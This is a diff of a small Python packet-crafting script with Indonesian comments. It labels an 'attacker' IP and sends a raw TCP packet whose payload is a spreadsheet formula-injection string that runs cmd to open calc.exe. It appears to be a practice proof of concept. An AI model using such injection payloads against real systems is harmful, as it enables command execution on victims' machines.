@@ -6,12 +6,10 @@ target_port = 80
 attacker_ip = "192.168.1.17" # mesin attacker
 attacker_port = 80
 
-sql_payload = "=AAAA+BBBB-CCCC&'Hello'/12345&cmd|'/c calc.exe'!A"
+payload = "=AAAA+BBBB-CCCC&'Hello'/12345&cmd|'/c calc.exe'!A"
 
 ip_layer = IP(src=attacker_ip, dst=target_ip)
 tcp_layer = TCP(sport=attacker_port, dport=target_port)
-
-payload = sql_payload
 
 # buat paket
 packet = ip_layer / tcp_layer / payload
